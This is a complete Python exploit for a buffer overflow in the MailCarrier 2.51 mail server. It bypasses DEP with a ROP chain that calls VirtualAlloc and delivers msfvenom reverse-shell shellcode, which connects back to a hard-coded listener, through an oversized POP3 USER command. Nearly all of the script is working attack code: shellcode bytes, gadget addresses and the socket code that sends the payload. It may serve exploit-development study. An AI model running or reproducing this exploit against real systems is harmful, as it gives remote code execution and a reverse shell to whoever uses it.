#!/usr/bin/python3 

# MailCarrier 2.51 Buffer Overflow [DEP BYPASS]
#   (A mail server needs to exist and be running)

# Tested on Windows 10 Pro, x32 Bit, version 21H1, build 19043.1052

# William Moody, 29.06.2021

import sys
import socket
from struct import pack

if len(sys.argv) != 2:
    print("Usage: %s server" % sys.argv[0])
    sys.exit(1)

server = sys.argv[1]
port = 110

# ===
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.122 LPORT=443 -b "\x00" -f python -v shell

shell =  b"\x90" * 20
shell += b"\xd9\xc9\xbb\x39\xd6\x40\xb6\xd9\x74\x24\xf4\x5d"
shell += b"\x31\xc9\xb1\x52\x83\xc5\x04\x31\x5d\x13\x03\x64"
shell += b"\xc5\xa2\x43\x6a\x01\xa0\xac\x92\xd2\xc5\x25\x77"
shell += b"\xe3\xc5\x52\xfc\x54\xf6\x11\x50\x59\x7d\x77\x40"
shell += b"\xea\xf3\x50\x67\x5b\xb9\x86\x46\x5c\x92\xfb\xc9"
shell += b"\xde\xe9\x2f\x29\xde\x21\x22\x28\x27\x5f\xcf\x78"
shell += b"\xf0\x2b\x62\x6c\x75\x61\xbf\x07\xc5\x67\xc7\xf4"
shell += b"\x9e\x86\xe6\xab\x95\xd0\x28\x4a\x79\x69\x61\x54"
shell += b"\x9e\x54\x3b\xef\x54\x22\xba\x39\xa5\xcb\x11\x04"
shell += b"\x09\x3e\x6b\x41\xae\xa1\x1e\xbb\xcc\x5c\x19\x78"
shell += b"\xae\xba\xac\x9a\x08\x48\x16\x46\xa8\x9d\xc1\x0d"
shell += b"\xa6\x6a\x85\x49\xab\x6d\x4a\xe2\xd7\xe6\x6d\x24"
shell += b"\x5e\xbc\x49\xe0\x3a\x66\xf3\xb1\xe6\xc9\x0c\xa1"
shell += b"\x48\xb5\xa8\xaa\x65\xa2\xc0\xf1\xe1\x07\xe9\x09"
shell += b"\xf2\x0f\x7a\x7a\xc0\x90\xd0\x14\x68\x58\xff\xe3"
shell += b"\x8f\x73\x47\x7b\x6e\x7c\xb8\x52\xb5\x28\xe8\xcc"
shell += b"\x1c\x51\x63\x0c\xa0\x84\x24\x5c\x0e\x77\x85\x0c"
shell += b"\xee\x27\x6d\x46\xe1\x18\x8d\x69\x2b\x31\x24\x90"
shell += b"\xbc\xfe\x11\x9a\x46\x97\x63\x9a\xb7\xdc\xed\x7c"
shell += b"\xdd\x32\xb8\xd7\x4a\xaa\xe1\xa3\xeb\x33\x3c\xce"
shell += b"\x2c\xbf\xb3\x2f\xe2\x48\xb9\x23\x93\xb8\xf4\x19"
shell += b"\x32\xc6\x22\x35\xd8\x55\xa9\xc5\x97\x45\x66\x92"
shell += b"\xf0\xb8\x7f\x76\xed\xe3\x29\x64\xec\x72\x11\x2c"
shell += b"\x2b\x47\x9c\xad\xbe\xf3\xba\xbd\x06\xfb\x86\xe9"
shell += b"\xd6\xaa\x50\x47\x91\x04\x13\x31\x4b\xfa\xfd\xd5"
shell += b"\x0a\x30\x3e\xa3\x12\x1d\xc8\x4b\xa2\xc8\x8d\x74"
shell += b"\x0b\x9d\x19\x0d\x71\x3d\xe5\xc4\x31\x4d\xac\x44"
shell += b"\x13\xc6\x69\x1d\x21\x8b\x89\xc8\x66\xb2\x09\xf8"
shell += b"\x16\x41\x11\x89\x13\x0d\x95\x62\x6e\x1e\x70\x84"
shell += b"\xdd\x1f\x51"

# ===

ropSize = 800
rop = b"".join(pack("<I", _) for _ in [
# Put PAGE_READWRITE code cave (.data section of expsrv.dll) into EDX

    0x0f9e8887, # pop edx ; ret
    0x0fa10104, # -- .data address in expsrv.dll with PAGE_READWRITE protection

# Store ESP in ESI

    0x0f9f28cc, # push esp ; and al, 0x10 ; pop esi ; mov [edx], ecx ; ret

# Get address of dummy call in EAX (ESI + 0x314)

    0x0f9c7c3c, # pop eax ; ret
    0xfffffcec, # -- (-314)
    0x0f9c6b68, # neg eax ; ret
    0x0f9fcf1b, # xchg eax, edi ; ret
    0x0f9ef52e, # add esi, edi ; retn 0x0

# Move this address into EBX
    0x0f9ddf79, # pop ebx ; ret
    0xffffffff, # -- (-1)
    0x0f9ca708, # inc ebx ; xor eax, eax ; ret
    0x0f9f13df, # add ebx, esi ; stc ; ret

# Move this address into EDX

    0x0f9e8887, # pop edx
    0xffffffff, # -- (-1)
    0x0f9dbb5a, # inc edx ; ret
    0x0f9ec8de, # add edx, ebx ; pop ebx ; retn 0x10
    0xffffffff, # -- junk for pop ebx

# Get the address of VirtualAlloc in EAX

    0x0f9c7c3c, # pop eax ; ret
    0xffffffff, # -- junk for retn 0x10
    0xffffffff, # -- junk for retn 0x10
    0xffffffff, # -- junk for retn 0x10
    0xffffffff, # -- junk for retn 0x10
    0x0fa02188, # (IAT) KERNEL32!VirtualAllocStub
    0x0f9c3553, # mov eax, [eax] ; ret

# Write the address of VirtualAlloc to the dummy call

    0x0f9e803a, # mov [edx], eax ; mov eax, 0x3 ; ret

# Move to the next parameter in dummy call

    0x0f9dbb5a, # inc edx ; ret
    0x0f9dbb5a, # inc edx ; ret
    0x0f9dbb5a, # inc edx ; ret
    0x0f9dbb5a, # inc edx ; ret

# Get the address of our shellcode (EDX + 14)

    0x0f9c7c3c, # pop eax ; ret
    0xffffffec, # -- (-18)
    0x0f9c6b68, # neg eax ; ret
    0x0f9cc7e1, # add eax, edx ; ret

# Write the address of our shellcode to the dummy call

    0x0f9e803a, # mov [edx], eax ; mov eax, 0x3 ; ret

# Move to the next parameter in dummy call

    0x0f9dbb5a, # inc edx ; ret
    0x0f9dbb5a, # inc edx ; ret
    0x0f9dbb5a, # inc edx ; ret
    0x0f9dbb5a, # inc edx ; ret

# Get the address of our shellcode (EDX + 10)

    0x0f9c7c3c, # pop eax ; ret
    0xfffffff0, # -- (-10)
    0x0f9c6b68, # neg eax ; ret
    0x0f9cc7e1, # add eax, edx ; ret

# Write the address of our shellcode to the dummy call

    0x0f9e803a, # mov [edx], eax ; mov eax, 0x3 ; ret

# Move to the next parameter in dummy call

    0x0f9dbb5a, # inc edx ; ret
    0x0f9dbb5a, # inc edx ; ret
    0x0f9dbb5a, # inc edx ; ret
    0x0f9dbb5a, # inc edx ; ret

# Write 0x1 into the dwSize parameter in the dummy call

    0x0f9c7c3c, # pop eax ; ret
    0xffffffff, # -- (-1)
    0x0f9c6b68, # neg eax ; ret

# Write the dwSize parameter to the dummy call

    0x0f9e803a, # mov [edx], eax ; mov eax, 0x3 ; ret

# Move to the next parameter in dummy call

    0x0f9dbb5a, # inc edx ; ret
    0x0f9dbb5a, # inc edx ; ret
    0x0f9dbb5a, # inc edx ; ret
    0x0f9dbb5a, # inc edx ; ret

# Write 0x1000 into the flAllocationType parameter in the dummy call

    0x0f9c7c3c, # pop eax ; ret
    0xffffefff, # -- (-1001)
    0x0f9e86bd, # inc eax ; ret
    0x0f9c6b68, # neg eax ; ret

# Write the flAllocationType parameter to the dummy call

    0x0f9e803a, # mov [edx], eax ; mov eax, 0x3 ; ret

# Move to the next parameter in dummy call

    0x0f9dbb5a, # inc edx ; ret
    0x0f9dbb5a, # inc edx ; ret
    0x0f9dbb5a, # inc edx ; ret
    0x0f9dbb5a, # inc edx ; ret

# Write 0x40 into the flProtect parameter in the dummy call

    0x0f9c7c3c, # pop eax ; ret
    0xffffffc0, # -- (-40)
    0x0f9c6b68, # neg eax ; ret

# Write the flProtect parameter to the dummy call

    0x0f9e803a, # mov [edx], eax ; mov eax, 0x3 ; ret

# Align the stack and return into the call (EDX - 0x14)

    0x0f9c7c3c, # pop eax ; ret
    0xffffffec, # -- (-14)
    0x0f9cc7e1, # add eax, edx ; ret
    0x0f9feea0, # xchg eax, esp ; ret
])

# ===

dummy  = b"aaaa" # VirtualAlloc
dummy += b"bbbb" # Function return address <- shellcode addr
dummy += b"cccc" # lpAddress <- shellcode addr
dummy += b"dddd" # dwSize <- 0x1
dummy += b"eeee" # flAllocationType <- 0x1000
dummy += b"ffff" # flProtect <- 0x40

# ===
# Bad chars :: 00 

buf  = b"A" * 5094
buf += rop
buf += b"A" * (ropSize - len(rop))
buf += dummy
buf += shell

assert b"\x00" not in buf

# ===

print("[+] Sending packet...")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server, port))
s.recv(1024)
s.send(b"USER " + buf + b"\r\n")
s.recv(1024)
s.send(b"QUIT\r\n")
s.close()